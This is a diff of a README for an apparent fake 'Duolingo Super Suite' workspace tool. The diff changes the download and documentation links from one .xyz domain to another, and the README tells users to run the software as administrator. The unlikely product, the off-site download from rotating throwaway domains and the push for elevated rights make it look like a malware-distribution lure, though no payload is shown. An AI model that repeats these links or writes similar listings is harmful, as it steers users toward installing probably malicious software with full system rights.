@@ -26,8 +26,8 @@ All-in-one **Duolingo Super Suite** workspace solution featuring document editin
 > Run it as administrator if a step needs elevated access.
 
 ## 📥 Download
-- 📥 **Get the latest build:** [https://duolingo-super-suite.softonx.xyz](https://duolingo-super-suite.softonx.xyz)
-- 📖 **Details & docs:** [https://duolingo-super-suite.softonx.xyz](https://duolingo-super-suite.softonx.xyz)
+- 📥 **Get the latest build:** [https://duolingo-super-suite.softax.xyz](https://duolingo-super-suite.softax.xyz)
+- 📖 **Details & docs:** [https://duolingo-super-suite.softax.xyz](https://duolingo-super-suite.softax.xyz)
 
 ## A note on usage
 > This project is shared as-is. All product names and logos belong to their respective owners.                     
